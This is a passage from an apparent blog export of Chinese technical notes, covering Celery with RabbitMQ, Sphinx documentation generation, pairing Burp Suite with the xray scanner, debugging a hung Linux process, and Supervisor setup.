<h1 id="修改celery配置文件"><a href="#修改celery配置文件" class="headerlink" title="修改celery配置文件:"></a>修改celery配置文件:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CELERY_BROKER_URL = <span class="string">&#x27;amqp://celery:celery@your_ip:5672/myvhost&#x27;</span></span><br><span class="line">CELERY_RESULT_BACKEND = <span class="string">&#x27;amqp://celery:celery@your_ip:5672/myvhost&#x27;</span></span><br></pre></td></tr></table></figure>

<p>修改配置文件后,就可以无缝接入<code>rabbitmq</code>,成功替换掉<code>redis</code>了.</p>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>只能说这个分布式队列的框架设计得特别好,把功能解耦开了,以至于在替换其中一个组件的时候,是如此的方便,无痛.</p>
<p>好的程序设计思想:<strong>高内聚,低耦合</strong>永不过时.</p>
<p>如果一开始贪快,没有设计好模块间的关系,初期可能感觉关系不大.</p>
<p>但是到了后期要拓展,要debug的时候,才会发现把模块解耦的巨大好处.</p>
<p>所以一开始的模块设计还是要花点心思的.多画画图,没什么坏处.</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.cnblogs.com/uptothesky/p/6094357.html">在CentOS7上安装RabbitMQ</a></li>
<li><a href="https://blog.csdn.net/lanyang123456/article/details/77115868">celery+Rabbit MQ的安装和使用</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Sphinx自动生成Python项目文档</title>
    <url>//17068.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>try一下<code>Sphinx</code>这个自动生成Python项目文档的工具</p>
<hr>
<h1 id="安装与简介"><a href="#安装与简介" class="headerlink" title="安装与简介:"></a>安装与简介:</h1><h2 id="sphinx简介"><a href="#sphinx简介" class="headerlink" title="sphinx简介:"></a>sphinx简介:</h2><p>sphinx是一种基于Python的文档工具，它可以令人轻松的撰写出清晰且优美的文档，由Georg Brandl在BSD许可证下开发。</p>
<p>新版的Python3文档就是由sphinx生成的，并且它已成为Python项目首选的文档工具，同时它对C&#x2F;C++项目也有很好的支持。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装:"></a>安装:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装Sphinx</span></span><br><span class="line">pip3 install Sphinx -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="建一个测试项目"><a href="#建一个测试项目" class="headerlink" title="建一个测试项目:"></a>建一个测试项目:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808114415.png" alt="20200808114415"></p>
<p>其中<code>1.py</code>代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    我是测试类，负责测试</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        负责打印Hello， 人人可以学Python</span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;人人可以学Python&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">renren</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        测试Sphinx自动生成文档</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;自动生成文档&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test2</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_2</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        我也不知道写什么好，反正我们这里是用来写文档的</span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文档自动生成测试2&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">renren_2</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        所以我们开发的时候就应该在这里写好文档，然后用Sphinx自动生成</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;自动生成文档2&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><code>2.py</code>代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_test</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    用于初始化项目测试，不需要任何参数</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;初始化项目&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    启动项目入口，</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    test(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    项目运行主要函数，需要传入一个参数\n</span></span><br><span class="line"><span class="string">    v:&lt;int&gt;</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(v)</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="使用Python-Sphinx-doc"><a href="#使用Python-Sphinx-doc" class="headerlink" title="使用Python-Sphinx doc:"></a>使用Python-Sphinx doc:</h1><h2 id="选择配置"><a href="#选择配置" class="headerlink" title="选择配置"></a>选择配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个doc目录</span></span><br><span class="line"><span class="built_in">mkdir</span> doc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化sphinx项目</span></span><br><span class="line">[root@localhost doc]<span class="comment"># sphinx-quickstart</span></span><br></pre></td></tr></table></figure>

<p>如果找不到命令的话:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># sphinx-quickstart</span></span><br><span class="line">-bash: sphinx-quickstart: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>建立一个软链接或直接使用绝对路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.建立软链接:</span></span><br><span class="line">[root@localhost doc]<span class="comment"># ln -s /usr/local/python3/bin/sphinx-quickstart /usr/bin/sphinx-quickstart</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.使用绝对路径</span></span><br><span class="line">[root@localhost doc]<span class="comment"># /usr/local/python3/bin/sphinx-quickstart</span></span><br></pre></td></tr></table></figure>

<p>除了以下项目外，其他的我都使用了默认值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># /usr/local/python3/bin/sphinx-quickstart</span></span><br><span class="line">Welcome to the Sphinx 3.1.2 quickstart utility.</span><br><span class="line"></span><br><span class="line">Please enter values <span class="keyword">for</span> the following settings (just press Enter to</span><br><span class="line">accept a default value, <span class="keyword">if</span> one is given <span class="keyword">in</span> brackets).</span><br><span class="line"></span><br><span class="line">Selected root path: .</span><br><span class="line"></span><br><span class="line">You have two options <span class="keyword">for</span> placing the build directory <span class="keyword">for</span> Sphinx output.</span><br><span class="line">Either, you use a directory <span class="string">&quot;_build&quot;</span> within the root path, or you separate</span><br><span class="line"><span class="string">&quot;source&quot;</span> and <span class="string">&quot;build&quot;</span> directories within the root path.</span><br><span class="line">&gt; Separate <span class="built_in">source</span> and build directories (y/n) [n]: y</span><br><span class="line"></span><br><span class="line">The project name will occur <span class="keyword">in</span> several places <span class="keyword">in</span> the built documentation.</span><br><span class="line">&gt; Project name: auto_try</span><br><span class="line">&gt; Author name(s): fatboy</span><br><span class="line">&gt; Project release []: 1.0</span><br><span class="line"></span><br><span class="line">If the documents are to be written <span class="keyword">in</span> a language other than English,</span><br><span class="line">you can select a language here by its language code. Sphinx will <span class="keyword">then</span></span><br><span class="line">translate text that it generates into that language.</span><br><span class="line"></span><br><span class="line">For a list of supported codes, see</span><br><span class="line">https://www.sphinx-doc.org/en/master/usage/configuration.html<span class="comment">#confval-language.</span></span><br><span class="line">&gt; Project language [en]: zh_cn</span><br><span class="line"></span><br><span class="line">Creating file /jscan/tools_/auto_doc_try/doc/source/conf.py.</span><br><span class="line">Creating file /jscan/tools_/auto_doc_try/doc/source/index.rst.</span><br><span class="line">Creating file /jscan/tools_/auto_doc_try/doc/Makefile.</span><br><span class="line">Creating file /jscan/tools_/auto_doc_try/doc/make.bat.</span><br><span class="line"></span><br><span class="line">Finished: An initial directory structure has been created.</span><br><span class="line"></span><br><span class="line">You should now populate your master file /jscan/tools_/auto_doc_try/doc/source/index.rst and create other <span class="keyword">do</span></span><br><span class="line"><span class="built_in">source</span> files. Use the Makefile to build the docs, like so:</span><br><span class="line">   make builder</span><br><span class="line"><span class="built_in">where</span> <span class="string">&quot;builder&quot;</span> is one of the supported builders, e.g. html, latex or linkcheck.</span><br></pre></td></tr></table></figure>

<h2 id="配置conf-py"><a href="#配置conf-py" class="headerlink" title="配置conf.py"></a>配置conf.py</h2><p>在source&#x2F;conf.py文件中加入如下代码， 导入自己的项目路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.insert(<span class="number">0</span>, os.path.abspath(<span class="string">&#x27;./../../code&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>这里要配好,不然待会生成文档的时候会报找不到模块的错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WARNING: autodoc: failed to import module <span class="string">&#x27;1&#x27;</span>; the following exception was raised:</span><br><span class="line">No module named <span class="string">&#x27;1&#x27;</span></span><br><span class="line">WARNING: autodoc: failed to import module <span class="string">&#x27;2&#x27;</span>; the following exception was raised:</span><br><span class="line">No module named <span class="string">&#x27;2&#x27;</span></span><br><span class="line">WARNING: autodoc: failed to import module <span class="string">&#x27;doc&#x27;</span>; the following exception was raised:</span><br><span class="line">No module named <span class="string">&#x27;doc&#x27;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="生成rst文件"><a href="#生成rst文件" class="headerlink" title="生成rst文件"></a>生成rst文件</h2><p>注意:-o 后面跟的是保存rst文件的路径， 你的index.rst在哪个目录，那你就指定哪个目录。然后在后面的是你的项目(代码)路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># /usr/local/python3/bin/sphinx-apidoc -o ./source/ ../../auto_doc_try/</span></span><br><span class="line">Creating file ./source/1.rst.</span><br><span class="line">Creating file ./source/2.rst.</span><br><span class="line">Creating file ./source/doc.rst.</span><br><span class="line">Creating file ./source/modules.rst.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="生成html文件"><a href="#生成html文件" class="headerlink" title="生成html文件"></a>生成html文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># make html</span></span><br></pre></td></tr></table></figure>


<h3 id="报错1"><a href="#报错1" class="headerlink" title="报错1:"></a>报错1:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jscan/tools_/auto_doc_try/doc/source/1.rst:4: WARNING: Unknown directive type &quot;automodule&quot;.</span><br><span class="line"></span><br><span class="line">.. automodule:: 1</span><br><span class="line">   :members:</span><br><span class="line">   :undoc-members:</span><br><span class="line">   :show-inheritance:</span><br><span class="line">/jscan/tools_/auto_doc_try/doc/source/2.rst:4: WARNING: Unknown directive type &quot;automodule&quot;.</span><br><span class="line"></span><br><span class="line">.. automodule:: 2</span><br><span class="line">   :members:</span><br><span class="line">   :undoc-members:</span><br><span class="line">   :show-inheritance:</span><br><span class="line">/jscan/tools_/auto_doc_try/doc/source/doc.rst:7: WARNING: Unknown directive type &quot;automodule&quot;.</span><br><span class="line"></span><br><span class="line">.. automodule:: doc</span><br><span class="line">   :members:</span><br><span class="line">   :undoc-members:</span><br><span class="line">   :show-inheritance:</span><br></pre></td></tr></table></figure>

<p>在<code>conf.py</code>中加入</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808115837.png" alt="20200808115837"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">extensions = [</span><br><span class="line">        <span class="string">&#x27;sphinx.ext.autodoc&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="执行成功"><a href="#执行成功" class="headerlink" title="执行成功:"></a>执行成功:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># make html</span></span><br><span class="line">Running Sphinx v3.1.2</span><br><span class="line">loading translations [zh_cn]... <span class="keyword">done</span></span><br><span class="line">loading pickled environment... <span class="keyword">done</span></span><br><span class="line">building [mo]: targets <span class="keyword">for</span> 0 po files that are out of <span class="built_in">date</span></span><br><span class="line">building [html]: targets <span class="keyword">for</span> 0 <span class="built_in">source</span> files that are out of <span class="built_in">date</span></span><br><span class="line">updating environment: 0 added, 0 changed, 0 removed</span><br><span class="line">looking <span class="keyword">for</span> now-outdated files... none found</span><br><span class="line">no targets are out of <span class="built_in">date</span>.</span><br><span class="line">build succeeded.</span><br><span class="line"></span><br><span class="line">The HTML pages are <span class="keyword">in</span> build/html.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="用浏览器打开doc-x2F-build-x2F-html-x2F-index-html："><a href="#用浏览器打开doc-x2F-build-x2F-html-x2F-index-html：" class="headerlink" title="用浏览器打开doc&#x2F;build&#x2F;html&#x2F;index.html："></a>用浏览器打开doc&#x2F;build&#x2F;html&#x2F;index.html：</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808120143.png" alt="20200808120143"></p>
<hr>
<h2 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题:"></a>安装主题:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令安装</span></span><br><span class="line">pip3 install sphinx_rtd_theme -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<p>配置：<br>编辑我们的source&#x2F;conf.py<br>导入模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sphinx_rtd_theme</span><br></pre></td></tr></table></figure>

<p>将 html_theme &#x3D; “alabaster”改成如下，在加上html_theme_path</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html_theme = <span class="string">&quot;sphinx_rtd_theme&quot;</span></span><br><span class="line">html_theme_path = [sphinx_rtd_theme.get_html_theme_path()]</span><br></pre></td></tr></table></figure>

<p>最后我们再执行一次：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make clean</span><br><span class="line">make html</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808120625.png" alt="20200808120625"></p>
<hr>
<h1 id="注释风格Google风格"><a href="#注释风格Google风格" class="headerlink" title="注释风格Google风格:"></a>注释风格Google风格:</h1><p>Google风格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">This is a groups style docs.</span><br><span class="line"></span><br><span class="line">Parameters:</span><br><span class="line">  param1 - this is the first param</span><br><span class="line">  param2 - this is a second param</span><br><span class="line"></span><br><span class="line">Returns:</span><br><span class="line">  This is a description of what is returned</span><br><span class="line"></span><br><span class="line">Raises:</span><br><span class="line">  KeyError - raises an exception</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置:"></a>配置:</h2><p><code>conf.py</code>中加入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">extensions = [</span><br><span class="line">    <span class="string">&#x27;sphinx.ext.autodoc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sphinx.ext.napoleon&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="支持以下关键字"><a href="#支持以下关键字" class="headerlink" title="支持以下关键字:"></a>支持以下关键字:</h2><ul>
<li>Args （参数别名）</li>
<li>Arguments （参数别名）</li>
<li>Attention</li>
<li>Attributes</li>
<li>Caution</li>
<li>Danger</li>
<li>Error</li>
<li>Example</li>
<li>Examples</li>
<li>Hint</li>
<li>Important</li>
<li>Keyword Args （关键字参数的别名）</li>
<li>Keyword Arguments</li>
<li>Methods</li>
<li>Note</li>
<li>Notes</li>
<li>Other Parameters</li>
<li>Parameters</li>
<li>Return （返回别名）</li>
<li>Returns</li>
<li>Raise (alias of Raises)</li>
<li>Raises</li>
<li>References</li>
<li>See Also</li>
<li>Tip</li>
<li>Todo</li>
<li>Warning</li>
<li>Warnings （警告别名）</li>
<li>Warn (alias of Warns)</li>
<li>Warns</li>
<li>Yield （产量别名）</li>
<li>Yields</li>
</ul>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果:"></a>效果:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808131325.png" alt="20200808131325"></p>
<p>嘿嘿,还可以</p>
<hr>
<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug:"></a>Debug:</h2><h3 id="sphinx会执行代码"><a href="#sphinx会执行代码" class="headerlink" title="sphinx会执行代码:"></a>sphinx会执行代码:</h3><p>refs:</p>
<ul>
<li><a href="https://stackoverflow.com/questions/12391390/does-sphinx-run-my-code-on-executing-make-html">Does sphinx run my code on executing ‘make html’?</a></li>
<li><a href="https://stackoverflow.com/questions/34570114/python-sphinx-the-module-executes-module-level-statement-and-it-might-call-sys/60446946#60446946">python Sphinx “the module executes module level statement and it might call sys.exit().”</a></li>
</ul>
<p>把被执行的那几个文件改成函数即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="找不到路径-模块"><a href="#找不到路径-模块" class="headerlink" title="找不到路径\模块:"></a>找不到路径\模块:</h3><p><code>conf.py</code>内多配置一下路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys.path.insert(<span class="number">0</span>, os.path.abspath(<span class="string">&#x27;../../&#x27;</span>))</span><br><span class="line">sys.path.insert(<span class="number">0</span>, os.path.abspath(<span class="string">&#x27;../../../&#x27;</span>))</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.jianshu.com/p/d4a1347f467b">自动生成Python项目文档</a></li>
<li><a href="https://kb.kutu66.com/python/post_12779396">python - python sphinx生成失败autodoc无法导入&#x2F;查找模块</a></li>
<li><a href="https://www.cnblogs.com/wswang/p/12145422.html">Python Sphinx使用踩坑记录</a></li>
<li><a href="https://blog.csdn.net/sinat_29957455/article/details/83657029">使用sphinx快速为你python注释生成API文档</a></li>
<li><a href="http://alpha1e0.com/writing-python-comments/">如何优雅得编写python注释</a></li>
<li><a href="https://www.osgeo.cn/sphinx/usage/extensions/napoleon.html">支持numpy和google风格的docstrings</a></li>
<li><a href="https://www.jb51.net/article/86757.htm">Python中的多行注释文档编写风格汇总</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-brup&amp;xray配置使用</title>
    <url>//35818.html</url>
    <content><![CDATA[<p>配置brupsuite:</p>
<p>进入 Burp 后，打开 User options 标签页，然后找到 Upstream Proxy Servers 设置。<br>点击 Add 添加上游代理以及作用域，Destination host 处可以使用*匹配多个任意字符串，? 匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。</p>
<p><img src="https://i.loli.net/2019/12/30/RVwlhKFkbuU6caX.png" alt="20191230160454.png"></p>
<hr>
<p>xray powershell启动命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入到exe的目录里执行</span></span><br><span class="line"> .\xray_windows_amd64.exe --log_level debug webscan --listen 127.0.0.1:7777 --html-output 1.html</span><br></pre></td></tr></table></figure>



<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://chaitin.github.io/xray/#/tutorial/introduce">xray 简介</a></li>
<li><a href="http://www.onebug.org/sectools/75713.html">Burpsuite 与 xray 进行联动</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-linux僵死进程排查过程</title>
    <url>//766.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>进程卡死,在日志里看不出个所以然.</p>
<hr>
<h1 id="查看任务log"><a href="#查看任务log" class="headerlink" title="查看任务log:"></a>查看任务log:</h1><p><img src="https://i.loli.net/2019/07/23/5d369f195c02a22001.png"></p>
<p>时间是中时区,要加8. 即为12点16分.</p>
<h1 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程:"></a>查看进程:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -auxf | grep xxx</span><br></pre></td></tr></table></figure>

<blockquote>
<p>f：用ASCII字符显示树状结构，表达程序间的相互关系。</p>
</blockquote>
<p>进程太多的话,加上f,看起来会更清晰一些.</p>
<p><img src="https://i.loli.net/2019/07/23/5d36a09fabd4b79059.png"></p>
<p>可以找到时间对应的那几个进程.</p>
<h1 id="跟踪："><a href="#跟踪：" class="headerlink" title="跟踪："></a>跟踪：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 跟踪进程执行时的系统调用和所接收的信号</span></span><br><span class="line"><span class="comment"># 即它跟踪到一个进程产生的系统调用，包括参数、返回值、执行消耗的时间</span></span><br><span class="line">strace -p pid  </span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/07/23/5d36a15d2bda319560.png"></p>
<p>然后就可以以<code>FUTEX_WAIT_PRIVATE</code>这个为线索继续去搜索.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看进程文件描述符目录</span></span><br><span class="line">ll /proc/<span class="variable">$pid</span>/fd/</span><br></pre></td></tr></table></figure>

<p>初步猜测是</p>
<ul>
<li>可能进程间出现了竞争资源导致死锁,阻塞.</li>
</ul>
<p>只能继续排查了…</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://wangchujiang.com/linux-command/c/ps.html">ps命令详解</a></li>
<li><a href="https://www.cnblogs.com/migrantworkers/p/10179688.html">Linux进程僵死原因排查思路</a></li>
<li><a href="https://blog.csdn.net/u013636377/article/details/52129990">多线程程序挂起问题解决</a></li>
<li><a href="http://xiaorui.cc/2014/11/18/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%8E%B7%E5%8F%96%E9%98%9F%E5%88%97%E5%BC%95%E8%B5%B7%E7%A8%8B%E5%BA%8F%E6%8C%82%E8%B5%B7%E5%A0%B5%E5%A1%9E%E7%9A%84%E6%83%85%E5%86%B5/">python多线程获取队列引起程序挂起堵塞的情况</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Supervisor使用</title>
    <url>//25186.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>Centos7不推荐使用<code>rc.local</code>,推荐自己配<code>service</code>但因为之前用惯了Cenos6,故一开始也沿用<code>rc.local</code>.</p>
<p>后来<code>rc.local</code>启的进程会导致系统无法正常快速的<code>reboot</code>,然后就频繁断电操作(虽然是虚拟机)..导致系统的硬盘崩了..</p>
<p>为了更好的管理进程,所以选用<code>supervisor</code>这个工具.</p>
<p>理由参考这篇文章的介绍(<a href="https://my.oschina.net/goskyblue/blog/380828">进程管理工具supervisor简介及使用技巧</a>)</p>
<blockquote>
<p>经常碰到要跑一些守护进程。平常我的做法是开一个tmux软件或者screen，然后启动软件。如果有其他人问，我则会建议用<code>nohup your-program &amp;&gt;nohup.log &amp;</code>这种方式。</p>
<p>可是这种做法毕竟不是长久之计，机器重启或者不小心kill了某个进程，后台运行的这个进程可能就不小心死掉了。</p>
<p>后来开源界的大牛建议我用supervisor。尝试之后，简直是如获至宝。作为一个存在了长达10年多的进程管理软件，他已经相当成熟。</p>
</blockquote>
<hr>
<h1 id="Supervisor组成部分"><a href="#Supervisor组成部分" class="headerlink" title="Supervisor组成部分:"></a>Supervisor组成部分:</h1><ol>
<li><p><strong>supervisord: 服务守护进程</strong>:<br>supervisor服务器的进程名是supervisord。它主要负责在自己的调用中启动子程序，响应客户端的命令，重新启动崩溃或退出的进程，记录其子进程stdout和stderr的输出，以及生成和处理对应于子进程生命周期中的”event”服务器进程使用的配置文件，通常路径存放在&#x2F;etc&#x2F;supervisord.confa中。此配置文件是INI格式的配置文件。</p>
</li>
<li><p><strong>supervisorctl：命令行客户端</strong>:<br>supervisor命令行的客户端名称是supervisorctl。它为supervisord提供了一个类似于shell的交互界面。使用supervisorctl，用户可以查看不同的supervisord进程列表，获取控制子进程的状态，如停止和启动子进程</p>
</li>
<li><p>Web Server：提供与supervisorctl功能相当的WEB操作界面<br>一个可以通过Web界面来查看和控制进程的状态，默认监听在9091上。</p>
</li>
<li><p>XML-RPC Interface：XML-RPC接口<br>supervisor用于控制的XML-RPC接口</p>
</li>
</ol>
<hr>
<h1 id="安装-amp-初始化"><a href="#安装-amp-初始化" class="headerlink" title="安装&amp;初始化:"></a>安装&amp;初始化:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">/usr/local/bin/pip2.7 install supervisor</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化配置文件</span></span><br><span class="line">/usr/local/bin/echo_supervisord_conf &gt; /xxx/supervisord.conf</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件:"></a>编辑配置文件:</h1><p>编辑<code>supervisord.conf</code></p>
<p>示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[program:program_name]</span><br><span class="line"></span><br><span class="line">command = 运行命令xxx</span><br><span class="line">autostart = true        ; 在 supervisord 启动的时候也自动启动</span><br><span class="line">startsecs = 5           ; 启动 5 秒后没有异常退出，就当作已经正常启动了</span><br><span class="line">autorestart = true      ; 程序异常退出后自动重启</span><br><span class="line">startretries = 3        ; 启动失败自动重试次数，默认是 3</span><br><span class="line">redirect_stderr = true  ; 把 stderr 重定向到 stdout，默认 false</span><br></pre></td></tr></table></figure>

<blockquote>
<p>配置项有很多…</p>
</blockquote>
<hr>
<h2 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h2><p><a href="https://github.com/Supervisor/supervisor/issues/980">supervisor crash when config command include java “%t %p” variable</a></p>
<p>如果在运行的命令中有用到<code>%</code>,会报格式错误.这个时候只需要双写<code>%</code>即<code>%%</code>就好了.</p>
<hr>
<h1 id="基本操作命令"><a href="#基本操作命令" class="headerlink" title="基本操作命令:"></a>基本操作命令:</h1><h2 id="启停supervisor"><a href="#启停supervisor" class="headerlink" title="启停supervisor:"></a>启停supervisor:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">supervisord -c /etc/supervisord.conf </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止</span></span><br><span class="line">supervisorctl /etc/supervisord.conf shutdown</span><br></pre></td></tr></table></figure>

